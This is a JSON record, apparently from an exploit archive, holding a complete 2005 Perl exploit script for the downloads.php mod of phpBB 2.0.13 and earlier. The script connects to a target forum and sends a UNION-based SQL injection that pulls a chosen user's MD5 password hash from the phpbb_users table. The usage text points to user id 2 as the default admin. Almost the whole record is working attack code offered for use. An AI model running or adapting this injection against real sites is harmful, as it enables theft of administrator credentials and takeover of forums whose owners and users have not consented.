{
  "id": "907",
  "title": "phpBB 2.0.13 - &#039;downloads.php&#039; mod Get Hash",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\n\r\n##    Example:\r\n##    C:\\>phpbb.pl www.site.com /phpBB2/ 2\r\n##\r\n##     downloads.php mod in phpBB <= 2.0.13\r\n##     **********************************\r\n##      [~] Connecting...\r\n##      [+] Connected!\r\n##      [~] Sending Data...\r\n##      [~] Data Sent, Waiting for response...\r\n##      [+] MD5 Hash for user with id=2 is: 81dc9bdb52d04dc20036dbd8313ed055\r\n##\r\nif (@ARGV < 3)\r\n{\r\nprint \"\\n\\n\";\r\nprint \"|****************************************************************|\\n\";\r\nprint \" phpBB <=2.0.13 'downloads.php' Mod\\n\";\r\nprint \" Bug found by Axl And CereBrums\\n\";\r\nprint \" Coded by CereBrums // 2/4/2005\\n\";\r\nprint \" Usage: phpbb.pl <site> <folder> <user_id>\\n\";\r\nprint \" e.g.: phpbb.pl www.site.com /phpBB2/ 2 \\n\";\r\nprint \" [~] <server> - site address\\n\";\r\nprint \" [~] <folder> - forum folder\\n\";\r\nprint \" [~] <user_id> - user id (2 default for phpBB admin)\\n\";\r\nprint \"|****************************************************************|\\n\";\r\nprint \"\\n\\n\";\r\nexit(1);\r\n}\r\n\r\n$take = 0;\r\n$success = 0;\r\n$server = $ARGV[0];\r\n$folder = $ARGV[1];\r\n$user_id = $ARGV[2];\r\nprint \"\\n downloads.php mod in phpBB <= 2.0.13\\n\";\r\nprint \" **********************************\\n\";\r\nprint \"  [~] Connecting...\\n\";\r\n$socket = IO::Socket::INET->new(\r\nProto => \"tcp\",\r\nPeerAddr => \"$server\",\r\nPeerPort => \"80\") || die \"$socket error $!\";\r\n\r\nprint \"  [+] Connected\\n\";\r\nprint \"  [~] Sending Data...\\n\";\r\n\r\n$path = \"http://$server/\";\r\n$path .= \"/$folder/\";\r\n$path .= \"downloads.php?cat=-1%20UNION%20SELECT%200,user_password,0,0,0,0,0,0,0%20FROM%20phpbb_users%20WHERE%20user_id=$user_id/*\";\r\nprint $socket \"GET $path HTTP/1.0\\r\\n\\r\\n\";\r\n\r\nprint \"  [~] Data Sent, Waiting for response...\\n\";\r\n\r\nwhile ($answer = <$socket>)\r\n{\r\n       if ($take == 1) {\r\n               $pass = substr($answer,51,32);\r\n               print \"  [+] MD5 Hash for user with id=$user_id is: $pass\\n\";\r\n               $success = 1;\r\n               $take = 0;\r\n       }\r\n       $found = rindex ($answer,\"downloads.php?view=detail&id=0&cat=0\");\r\n       if ( $found > -1 ) {\r\n               $take = 1;\r\n       }\r\n}\r\nif ($success==0) {print \"  [-] Exploit failed\\n\";}\r\n\r\n## EOF ##\r\n\r\n# milw0rm.com [2005-04-02]",
  "url": "https://www.exploit-db.com/exploits/907"
}